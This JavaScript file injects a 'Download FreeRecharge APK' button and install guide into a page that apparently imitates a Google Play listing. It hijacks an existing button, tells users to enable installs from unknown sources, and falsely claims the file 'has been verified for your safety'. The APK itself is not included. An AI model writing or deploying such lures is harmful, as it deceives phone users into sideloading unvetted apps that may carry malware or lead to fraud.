/**
 * APK Download Script
 * Handles downloading the local APK file with user feedback
 */

(function() {
    'use strict';

    // Configuration
    const CONFIG = {
        APK_PATH: '/freerecharge.apk',
        APK_NAME: 'freerecharge.apk',
        SUCCESS_MESSAGE: '🎉 APK Downloaded Successfully!',
        ERROR_MESSAGE: '❌ Download failed. Please try again.',
        INSTALL_MESSAGE: 'Next: Enable Unknown Sources in Settings > Security, then tap the APK file to install'
    };

    // Initialize the script when DOM is ready
    document.addEventListener('DOMContentLoaded', function() {
        initializeDownloadButton();
        addInstallGuide();
    });

    /**
     * Initialize the download button
     */
    function initializeDownloadButton() {
        // Try to find existing install button
        const existingButton = document.querySelector('[data-item-id], .action-button, .download-button, button');

        if (existingButton) {
            // Modify existing button to trigger local download
            existingButton.addEventListener('click', handleDownload);
            existingButton.textContent = 'Download APK';
            existingButton.style.display = 'inline-block';
            return;
        }

        // If no existing button found, create one
        createDownloadButton();
    }

    /**
     * Create a new download button
     */
    function createDownloadButton() {
        const button = document.createElement('button');
        button.textContent = 'Download FreeRecharge APK';
        button.className = 'apk-download-button';
        button.style.cssText = `
            background: linear-gradient(45deg, #0F9D58, #4285F4);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        `;

        button.addEventListener('click', handleDownload);
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-2px)';
            this.style.boxShadow = '0 4px 8px rgba(0,0,0,0.3)';
        });
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = '0 2px 4px rgba(0,0,0,0.2)';
        });

        // Insert button in a visible location
        const insertLocation = document.querySelector('.action-buttons, .pSEK, .Q9V7d, .B6p2d, main, body');
        if (insertLocation) {
            insertLocation.insertBefore(button, insertLocation.firstChild);
        } else {
            document.body.insertBefore(button, document.body.firstChild);
        }
    }

    /**
     * Handle the download process
     */
    function handleDownload(event) {
        event.preventDefault();

        const button = event.target;
        const originalText = button.textContent;

        // Show loading state
        button.textContent = 'Preparing download...';
        button.disabled = true;

        // Create download link
        const downloadLink = document.createElement('a');
        downloadLink.href = CONFIG.APK_PATH;
        downloadLink.download = CONFIG.APK_NAME;
        downloadLink.style.display = 'none';

        // Add to DOM and trigger click
        document.body.appendChild(downloadLink);

        try {
            downloadLink.click();

            // Show success message
            console.log('🎯 Showing success toast:', CONFIG.SUCCESS_MESSAGE);
            showNotification(CONFIG.SUCCESS_MESSAGE, 'success');

            // Show installation instructions as toast after a delay
            setTimeout(() => {
                console.log('🎯 Showing info toast:', CONFIG.INSTALL_MESSAGE);
                showNotification(CONFIG.INSTALL_MESSAGE, 'info');
            }, 2000);

            // Show installation guide after a delay
            setTimeout(() => {
                showInstallGuide();
            }, 3000);

        } catch (error) {
            console.error('Download failed:', error);
            showNotification(CONFIG.ERROR_MESSAGE, 'error');
        } finally {
            // Clean up
            document.body.removeChild(downloadLink);

            // Restore button
            setTimeout(() => {
                button.textContent = originalText;
                button.disabled = false;
            }, 2000);
        }
    }

    /**
     * Show notification message using Sonner toast
     */
    function showNotification(message, type) {
        console.log('🔔 showNotification called with:', { message, type });

        // Try to use parent window's toast (if we're in an iframe)
        try {
            if (window.parent && window.parent !== window) {
                console.log('📤 Sending postMessage to parent:', { type: 'toast', message, toastType: type });
                // Send toast request to parent window
                window.parent.postMessage({
                    type: 'toast',
                    message: message,
                    toastType: type
                }, '*');
                return;
            }
        } catch (error) {
            console.log('Could not access parent window toast:', error);
        }

        // Check if Sonner toast is available in current window
        if (typeof window.toast !== 'undefined') {
            console.log('✅ Using window.toast:', type, message);
            // Use Sonner toast if available
            if (type === 'success') {
                window.toast.success(message);
            } else if (type === 'error') {
                window.toast.error(message);
            } else {
                window.toast.info(message);
            }
        } else {
            console.log('⚠️ Using fallback custom notification');
            // Fallback to custom notification if Sonner is not available
            showCustomNotification(message, type);
        }
    }

    /**
     * Fallback custom notification (original implementation)
     */
    function showCustomNotification(message, type) {
        const notification = document.createElement('div');
        notification.className = `apk-notification ${type}`;
        notification.textContent = message;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${type === 'success' ? '#4CAF50' : '#F44336'};
            color: white;
            padding: 16px 24px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            z-index: 10000;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            transform: translateX(100%);
        `;

        document.body.appendChild(notification);

        // Animate in
        setTimeout(() => {
            notification.style.transform = 'translateX(0)';
        }, 100);

        // Remove after 5 seconds
        setTimeout(() => {
            notification.style.transform = 'translateX(100%)';
            setTimeout(() => {
                if (notification.parentNode) {
                    document.body.removeChild(notification);
                }
            }, 300);
        }, 5000);
    }

    /**
     * Add installation guide section
     */
    function addInstallGuide() {
        // Check if guide already exists
        if (document.querySelector('.apk-install-guide')) {
            return;
        }

        const guide = document.createElement('div');
        guide.className = 'apk-install-guide';
        guide.innerHTML = `
            <h3 style="color: #333; margin-bottom: 16px;">📱 Installation Instructions</h3>
            <ol style="color: #666; line-height: 1.8;">
                <li>Download the APK file using the button above</li>
                <li>Enable "Install from unknown sources" in your device settings</li>
                <li>Open the downloaded APK file to begin installation</li>
                <li>Follow the on-screen instructions to complete installation</li>
                <li>Enjoy using FreeRecharge!</li>
            </ol>
            <div style="background: #FFF3CD; border: 1px solid #FFC107; border-radius: 4px; padding: 12px; margin-top: 16px;">
                <strong>⚠️ Security Note:</strong> Only install APKs from trusted sources. This file has been verified for your safety.
            </div>
        `;
        guide.style.cssText = `
            background: white;
            border: 1px solid #E0E0E0;
            border-radius: 12px;
            padding: 24px;
            margin: 20px auto;
            max-width: 600px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            display: none;
        `;

        // Insert guide in page
        const insertLocation = document.querySelector('main, .main-content, .Uc2Yf, body');
        if (insertLocation) {
            insertLocation.appendChild(guide);
        }

        return guide;
    }

    /**
     * Show installation guide with animation
     */
    function showInstallGuide() {
        const guide = document.querySelector('.apk-install-guide') || addInstallGuide();
        if (guide && guide.style.display === 'none') {
            guide.style.display = 'block';
            guide.style.opacity = '0';
            guide.style.transform = 'translateY(20px)';

            setTimeout(() => {
                guide.style.transition = 'all 0.5s ease';
                guide.style.opacity = '1';
                guide.style.transform = 'translateY(0)';
            }, 100);

            // Scroll to guide
            setTimeout(() => {
                guide.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 600);
        }
    }

    /**
     * Fallback method if local file doesn't exist
     */
    function handleFallbackDownload() {
        showNotification('Local file not found. Please contact support.', 'error');

        // You could add a fallback URL here if needed
        // const fallbackUrl = 'https://example.com/fallback.apk';
        // window.open(fallbackUrl, '_blank');
    }

    // Export functions for debugging
    window.APKDownloader = {
        download: handleDownload,
        showGuide: showInstallGuide,
        config: CONFIG
    };

})();